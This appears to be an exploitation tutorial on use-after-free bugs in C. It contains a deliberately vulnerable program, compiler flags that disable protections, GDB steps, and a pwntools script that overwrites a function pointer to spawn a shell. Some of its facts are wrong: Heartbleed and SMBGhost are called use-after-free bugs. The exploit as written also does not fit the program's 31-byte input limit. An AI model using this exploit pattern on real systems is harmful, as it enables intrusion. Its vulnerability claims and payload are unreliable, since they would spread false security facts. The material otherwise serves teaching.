# Use-After-Free (UAF)

## Overview

A **Use-After-Free (UAF)** vulnerability occurs when a program continues to use a pointer after the memory it points to has been freed. This creates a **dangling pointer** that can be exploited by reallocating the freed memory with attacker-controlled data, leading to arbitrary code execution.

---

## Vulnerable C Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Object structure with function pointer
typedef struct {
    char name[32];
    void (*print_func)(char *);
} User;

// Legitimate print function
void safe_print(char *name) {
    printf("User: %s\n", name);
}

// Malicious function (simulates attacker goal)
void evil_function(char *name) {
    printf("[!] EXPLOIT: Executing arbitrary code!\n");
    system("/bin/sh");  // Spawn shell
}

int main() {
    User *user1, *user2;
    char input[32];
    
    // Allocate user object
    user1 = (User *)malloc(sizeof(User));
    strcpy(user1->name, "Alice");
    user1->print_func = safe_print;
    
    printf("User created: %s\n", user1->name);
    user1->print_func(user1->name);  // Normal execution
    
    // VULNERABILITY: Free the object
    free(user1);
    printf("[*] User object freed\n");
    
    // Simulate attacker input (reallocates freed memory)
    printf("Enter new user name: ");
    fgets(input, sizeof(input), stdin);
    input[strcspn(input, "\n")] = 0;  // Remove newline
    
    // Allocate new object (likely reuses freed chunk)
    user2 = (User *)malloc(sizeof(User));
    strcpy(user2->name, input);
    user2->print_func = evil_function;  // Attacker controls this!
    
    // VULNERABILITY: Use the old pointer (dangling)
    printf("[*] Calling function via old pointer...\n");
    user1->print_func(user1->name);  // Uses freed memory!
    
    return 0;
}
```

### Compilation
```bash
# Compile with minimal protections
gcc -o uaf uaf.c -no-pie -fno-stack-protector

# Flags:
# -no-pie              : Disable ASLR for executable
# -fno-stack-protector : Disable stack canaries (not critical for heap)
```

---

## Assembly Emulation (Intel Syntax - x64)

```asm
main:
    ; Function prologue
    push   rbp
    mov    rbp, rsp
    sub    rsp, 0x40            ; Allocate stack space
    
    ; malloc(sizeof(User)) - First allocation
    mov    edi, 0x28            ; sizeof(User) = 40 bytes (32 + 8 for func ptr)
    call   malloc@plt
    mov    QWORD PTR [rbp-8], rax   ; Store user1 pointer
    
    ; strcpy(user1->name, "Alice")
    mov    rax, QWORD PTR [rbp-8]
    lea    rsi, [rip+.LC0]      ; "Alice"
    mov    rdi, rax
    call   strcpy@plt
    
    ; user1->print_func = safe_print
    mov    rax, QWORD PTR [rbp-8]
    lea    rdx, [rip+safe_print]
    mov    QWORD PTR [rax+32], rdx  ; Offset 32 = function pointer
    
    ; user1->print_func(user1->name) - Normal call
    mov    rax, QWORD PTR [rbp-8]
    mov    rdx, QWORD PTR [rax+32]  ; Load function pointer
    mov    rax, QWORD PTR [rbp-8]
    mov    rdi, rax                 ; Pass user1->name as argument
    call   rdx                      ; Call safe_print
    
    ; free(user1) - CRITICAL: Memory freed
    mov    rax, QWORD PTR [rbp-8]
    mov    rdi, rax
    call   free@plt
    
    ; malloc(sizeof(User)) - Second allocation (reuses freed chunk)
    mov    edi, 0x28
    call   malloc@plt
    mov    QWORD PTR [rbp-16], rax  ; Store user2 pointer
    
    ; user2->print_func = evil_function
    mov    rax, QWORD PTR [rbp-16]
    lea    rdx, [rip+evil_function]
    mov    QWORD PTR [rax+32], rdx  ; Overwrite function pointer
    
    ; user1->print_func(user1->name) - VULNERABILITY: Use after free!
    mov    rax, QWORD PTR [rbp-8]   ; Load OLD pointer (freed)
    mov    rdx, QWORD PTR [rax+32]  ; Load function pointer from FREED memory
    mov    rax, QWORD PTR [rbp-8]
    mov    rdi, rax
    call   rdx                      ; Calls evil_function!
    
    ; Epilogue
    mov    eax, 0
    leave
    ret
```

### Critical Observations

| Instruction | Memory State | Exploitation Impact |
|-------------|--------------|---------------------|
| `call malloc@plt` (1st) | Allocates chunk at `0x555555559000` | user1 points here |
| `call free@plt` | Chunk returned to freelist | Memory still contains data! |
| `call malloc@plt` (2nd) | **Reuses same chunk** `0x555555559000` | user2 == user1 (same address) |
| `mov QWORD PTR [rax+32], rdx` | Overwrites function pointer | user1->print_func now points to evil_function |
| `call rdx` (via user1) | Executes from freed memory | Arbitrary code execution |

---

## Memory State Visualization

### Heap Layout (glibc malloc)

#### Normal State (After First Allocation)

```
Heap Memory (0x555555559000)
┌─────────────────────────────────────┐
│  Chunk Header (16 bytes)            │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │
│  │ size: 0x31 (48 bytes + flag)│    │
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤ ← user1 points here
│  User Data (40 bytes)               │
│  ┌─────────────────────────────┐    │
│  │ name[32]: "Alice\0..."      │    │  Offset 0-31
│  │ print_func: 0x555555555189  │    │  Offset 32-39 (safe_print addr)
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤
│  Unused heap space                  │
└─────────────────────────────────────┘
```

#### After free(user1) - Chunk in Freelist

```
Heap Memory (0x555555559000)
┌─────────────────────────────────────┐
│  Chunk Header (16 bytes)            │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │
│  │ size: 0x31 (freed)          │    │
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤ ← user1 STILL points here (dangling!)
│  Freelist Metadata (tcache/fastbin) │
│  ┌─────────────────────────────┐    │
│  │ fd: 0x0 (next free chunk)   │    │  Forward pointer
│  │ bk: 0x0 (prev free chunk)   │    │  Backward pointer (if applicable)
│  │ ... (old data remains) ...  │    │  name[] and print_func still in memory!
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤
│  Unused heap space                  │
└─────────────────────────────────────┘

CRITICAL: user1 pointer is now DANGLING (points to freed memory)
```

#### After Second malloc (Chunk Reused)

```
Heap Memory (0x555555559000)
┌─────────────────────────────────────┐
│  Chunk Header (16 bytes)            │
│  ┌─────────────────────────────┐    │
│  │ prev_size: 0x0              │    │
│  │ size: 0x31 (allocated)      │    │
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤ ← user1 AND user2 point here!
│  User Data (40 bytes)               │
│  ┌─────────────────────────────┐    │
│  │ name[32]: "Attacker\0..."   │    │  Controlled by attacker
│  │ print_func: 0x5555555551C0  │    │  evil_function address!
│  └─────────────────────────────┘    │
├─────────────────────────────────────┤
│  Unused heap space                  │
└─────────────────────────────────────┘

When user1->print_func() is called:
1. Dereferences user1 (freed pointer)
2. Reads function pointer at offset 32
3. Finds evil_function address (placed by user2)
4. Executes evil_function → Shell spawned!
```

---

## Exploitation Workflow

### Step 1: Identify UAF Pattern

**Static Analysis (Ghidra/IDA):**
```c
// Look for this pattern:
ptr = malloc(size);
// ... use ptr ...
free(ptr);
// ... no ptr = NULL ...
ptr->field;  // USE AFTER FREE!
```

**Dynamic Analysis (GDB):**
```bash
gdb ./uaf
(gdb) break free
(gdb) run
# When breakpoint hits:
(gdb) x/10gx $rdi  # Examine memory being freed
(gdb) continue
# Set watchpoint on freed memory
(gdb) watch *(long*)0x555555559000
```

### Step 2: Verify Chunk Reuse

```bash
# Run with heap debugging
gdb ./uaf
(gdb) set environment MALLOC_CHECK_ 2
(gdb) run

# Check if malloc returns same address
(gdb) break malloc
(gdb) commands
> printf "malloc returned: %p\n", $rax
> continue
> end
```

### Step 3: Craft Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = ELF('./uaf')
p = process(binary.path)

# Find address of evil_function (or inject shellcode)
evil_func_addr = binary.symbols['evil_function']
log.info(f"evil_function @ {hex(evil_func_addr)}")

# Payload: Overwrite function pointer
# Structure: [name (32 bytes)][function_ptr (8 bytes)]
payload = b"A" * 32  # Fill name field
payload += p64(evil_func_addr)  # Overwrite function pointer

# Send payload when prompted
p.sendlineafter(b"Enter new user name: ", payload)

# Interact with spawned shell
p.interactive()
```

---

## Heap Allocator Internals (glibc)

### Tcache (Thread Local Cache)

For small allocations (< 1024 bytes), glibc uses **tcache** (since glibc 2.26):

```
Tcache Bin (size 0x30)
┌─────────────────────────┐
│ tcache_entry            │
│ ┌─────────────────────┐ │
│ │ next: 0x555555559040│ │ ← Points to next free chunk
│ └─────────────────────┘ │
└─────────────────────────┘

When malloc(40) is called:
1. Check tcache bin for size 0x30 (48 bytes rounded)
2. If available, return chunk immediately (LIFO)
3. No coalescing or safety checks!
```

### Fastbins (Legacy)

For older glibc or larger allocations:

```
Fastbin[3] (size 0x30)
┌─────────────────────────┐
│ Chunk 1                 │
│ fd → Chunk 2            │ ← Forward pointer (single-linked list)
└─────────────────────────┘
```

**Exploitation:** Overwrite `fd` pointer to allocate arbitrary memory.

---

## Mitigation Techniques

| Protection | Mechanism | Bypass Method |
|-----------|-----------|---------------|
| **Nullify Pointers** | `ptr = NULL` after `free(ptr)` | Requires code change |
| **Reference Counting** | Track object lifetime | Complex, performance overhead |
| **Garbage Collection** | Automatic memory management | Language-level (not C/C++) |
| **AddressSanitizer** | Detect UAF at runtime | Development/testing only |
| **Heap Hardening** | Tcache double-free checks | Bypass via heap grooming |

---

## Real-World Examples

1. **CVE-2014-0160 (Heartbleed):** OpenSSL UAF leading to memory disclosure
2. **CVE-2015-0311:** Adobe Flash Player UAF → RCE
3. **CVE-2020-0796 (SMBGhost):** Windows SMBv3 UAF → SYSTEM shell

---

## Key Takeaways

1. **Root Cause:** Using pointers after `free()` without nullification
2. **Impact:** Arbitrary code execution via function pointer overwrite
3. **Detection:** Static analysis for free/use patterns, dynamic heap tracking
4. **Exploitation:** Heap grooming to control reallocated memory
5. **Modern Defense:** AddressSanitizer (ASAN), smart pointers (C++)

---

## Further Reading

- [Glibc Malloc Internals](https://sourceware.org/glibc/wiki/MallocInternals)
- [Tcache Exploitation](https://github.com/shellphish/how2heap)
- [Heap Exploitation Techniques](../Heap_Corruption/)

---

**Practice Challenge:** Exploit this binary with ASLR enabled (requires heap address leak).
